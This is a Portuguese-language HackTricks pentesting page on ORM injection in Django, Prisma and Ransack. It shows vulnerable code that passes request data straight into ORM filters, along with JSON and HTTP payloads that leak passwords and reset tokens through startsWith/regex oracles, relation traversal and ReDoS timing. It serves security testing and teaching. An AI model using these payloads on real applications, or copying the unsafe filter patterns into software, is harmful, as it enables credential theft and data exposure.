# ORM Injection

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

## Django ORM (Python)

Em [**este post**](https://www.elttam.com/blog/plormbing-your-django-orm/) √© explicado como √© poss√≠vel tornar um Django ORM vulner√°vel usando, por exemplo, um c√≥digo como:

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
"""
Uma vis√£o b√°sica da API que os usu√°rios enviam solicita√ß√µes para
procurar artigos
"""
def post(self, request: Request, format=None):
try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
except Exception as e:
return Response([])
return Response(serializer.data)
</code></pre>

Note como todos os request.data (que ser√° um json) s√£o passados diretamente para **filtrar objetos do banco de dados**. Um atacante poderia enviar filtros inesperados para vazar mais dados do que o esperado.

Exemplos:

* **Login:** Em um login simples, tente vazar as senhas dos usu√°rios registrados nele.
```json
{
"username": "admin",
"password_startswith":"a"
}
```
{% hint style="danger" %}
√â poss√≠vel for√ßar a senha at√© que ela seja vazada.
{% endhint %}

* **Filtragem relacional**: √â poss√≠vel percorrer rela√ß√µes para vazar informa√ß√µes de colunas que nem eram esperadas para serem usadas na opera√ß√£o. Por exemplo, se for poss√≠vel vazar artigos criados por um usu√°rio com essas rela√ß√µes: Article(`created_by`) -\[1..1]-> Author (`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__user__password__contains":"pass"
}
```
{% hint style="danger" %}
√â poss√≠vel encontrar a senha de todos os usu√°rios que criaram um artigo
{% endhint %}

* **Filtragem relacional muitos-para-muitos**: No exemplo anterior, n√£o conseguimos encontrar senhas de usu√°rios que n√£o criaram um artigo. No entanto, seguindo outros relacionamentos, isso √© poss√≠vel. Por exemplo: Article(`created_by`) -\[1..1]-> Author(`departments`) -\[0..\*]-> Department(`employees`) -\[0..\*]-> Author(`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__departments__employees__user_startswith":"admi"
}
```
{% hint style="danger" %}
Neste caso, podemos encontrar todos os usu√°rios nos departamentos de usu√°rios que criaram artigos e, em seguida, vazar suas senhas (no json anterior, estamos apenas vazando os nomes de usu√°rio, mas depois √© poss√≠vel vazar as senhas).
{% endhint %}

* **Abusando das rela√ß√µes muitos-para-muitos de Grupo e Permiss√£o do Django com usu√°rios**: Al√©m disso, o modelo AbstractUser √© usado para gerar usu√°rios no Django e, por padr√£o, esse modelo possui algumas **rela√ß√µes muitos-para-muitos com as tabelas de Permiss√£o e Grupo**. O que basicamente √© uma maneira padr√£o de **acessar outros usu√°rios a partir de um usu√°rio** se eles estiverem no **mesmo grupo ou compartilharem a mesma permiss√£o**.
```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```
* **Contornar restri√ß√µes de filtro**: O mesmo post do blog prop√¥s contornar o uso de alguns filtros como `articles = Article.objects.filter(is_secret=False, **request.data)`. √â poss√≠vel despejar artigos que t√™m is\_secret=True porque podemos voltar de um relacionamento para a tabela Article e vazar artigos secretos a partir de artigos n√£o secretos, pois os resultados s√£o unidos e o campo is\_secret √© verificado no artigo n√£o secreto enquanto os dados s√£o vazados do artigo secreto.
```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```
{% hint style="danger" %}
Abusando de relacionamentos, √© poss√≠vel contornar at√© mesmo filtros destinados a proteger os dados exibidos.
{% endhint %}

* **Baseado em erro/tempo via ReDoS**: Nos exemplos anteriores, esperava-se ter respostas diferentes se o filtro funcionasse ou n√£o para usar isso como or√°culo. Mas pode ser poss√≠vel que alguma a√ß√£o seja realizada no banco de dados e a resposta seja sempre a mesma. Nesse cen√°rio, pode ser poss√≠vel provocar um erro no banco de dados para obter um novo or√°culo.
```json
// Non matching password
{
"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```
* **SQLite**: N√£o possui um operador regexp por padr√£o (√© necess√°rio carregar uma extens√£o de terceiros)
* **PostgreSQL**: N√£o possui um tempo limite de regex por padr√£o e √© menos propenso a retrocessos
* **MariaDB**: N√£o possui um tempo limite de regex

## Prisma ORM (NodeJS)

Os seguintes s√£o [**truques extra√≠dos deste post**](https://www.elttam.com/blog/plorming-your-primsa-orm/).

* **Controle total de busca**:

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
try {
// O atacante tem controle total de todas as op√ß√µes do prisma
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

√â poss√≠vel ver que todo o corpo javascript √© passado para o prisma para realizar consultas.

No exemplo do post original, isso verificaria todos os posts criados por algu√©m (cada post √© criado por algu√©m) retornando tamb√©m as informa√ß√µes do usu√°rio dessa pessoa (nome de usu√°rio, senha...)
```json
{
"filter": {
"include": {
"createdBy": true
}
}
}

// Response
[
{
"id": 1,
"title": "Buy Our Essential Oils",
"body": "They are very healthy to drink",
"published": true,
"createdById": 1,
"createdBy": {
"email": "karen@example.com",
"id": 1,
"isAdmin": false,
"name": "karen",
"password": "super secret passphrase",
"resetToken": "2eed5e80da4b7491"
}
},
...
]
```
O seguinte seleciona todos os posts criados por algu√©m com uma senha e retornar√° a senha:
```json
{
"filter": {
"select": {
"createdBy": {
"select": {
"password": true
}
}
}
}
}

// Response
[
{
"createdBy": {
"password": "super secret passphrase"
}
},
...
]
```
* **Controle total da cl√°usula where**:

Vamos dar uma olhada onde o ataque pode controlar a cl√°usula `where`:

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
try {
const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // Vulner√°vel a vazamentos de ORM
</strong>        })
res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

√â poss√≠vel filtrar a senha dos usu√°rios diretamente como:
```javascript
await prisma.article.findMany({
where: {
createdBy: {
password: {
startsWith: "pas"
}
}
}
})
```
{% hint style="danger" %}
Usando opera√ß√µes como `startsWith`, √© poss√≠vel vazar informa√ß√µes.&#x20;
{% endhint %}

* **Contornando filtragem relacional muitos-para-muitos:**&#x20;
```javascript
app.post('/articles', async (req, res) => {
try {
const query = req.body.query;
query.published = true;
const posts = await prisma.article.findMany({ where: query })
res.json(posts);
} catch (error) {
res.json([]);
}
});
```
√â poss√≠vel vazar artigos n√£o publicados ao retornar √†s rela√ß√µes muitos-para-muitos entre `Category` -\[\*..\*]-> `Article`:
```json
{
"query": {
"categories": {
"some": {
"articles": {
"some": {
"published": false,
"{articleFieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
```
√â tamb√©m poss√≠vel vazar todos os usu√°rios abusando de alguns relacionamentos muitos-para-muitos de loopback:
```json
{
"query": {
"createdBy": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"{fieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
```
* **Consultas de erro/tempo**: No post original, voc√™ pode ler um conjunto muito extenso de testes realizados para encontrar a carga √∫til ideal para vazar informa√ß√µes com uma carga √∫til baseada em tempo. Isso √©:
```json
{
"OR": [
{
"NOT": {ORM_LEAK}
},
{CONTAINS_LIST}
]
}
```
Onde o `{CONTAINS_LIST}` √© uma lista com 1000 strings para garantir que a **resposta seja atrasada quando o vazamento correto for encontrado.**

## **Ransack (Ruby)**

Esses truques foram [**encontrados neste post**](https://positive.security/blog/ransack-data-exfiltration)**.**

{% hint style="success" %}
**Observe que o Ransack 4.0.0.0 agora exige o uso de uma lista de permiss√£o expl√≠cita para atributos e associa√ß√µes pesquis√°veis.**
{% endhint %}

**Exemplo vulner√°vel:**
```ruby
def index
@q = Post.ransack(params[:q])
@posts = @q.result(distinct: true)
end
```
Note como a consulta ser√° definida pelos par√¢metros enviados pelo atacante. Foi poss√≠vel, por exemplo, for√ßar o token de redefini√ß√£o com:
```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```
Por for√ßa bruta e potencialmente relacionamentos, foi poss√≠vel vazar mais dados de um banco de dados.

## Refer√™ncias

* [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
* [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
